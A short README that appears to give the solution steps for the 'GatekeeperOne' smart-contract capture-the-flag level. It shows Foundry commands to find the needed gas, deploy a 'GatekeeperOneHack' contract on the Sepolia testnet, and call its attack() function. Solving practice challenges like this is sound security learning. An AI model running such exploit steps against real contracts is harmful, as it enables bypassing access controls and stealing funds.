# GatekeeperOne Solution

Uncomment line 16 in `test/GatekeeperOneTest` and add the `instanceAddress`, then comment out line 15.

Find the correct amount of `gas`:

```
forge test --mt test_gateTwo --rpc-url $SEPOLIA_RPC_URL -vvv
```

Deploy `GatekeeperOneHack`:

```
forge create GatekeeperOneHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

Call the `attack()` function:

```
cast send `gatekeeperOneHackAddress` "attack(address,uint256)" `ìnstanceAddress` `gas` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
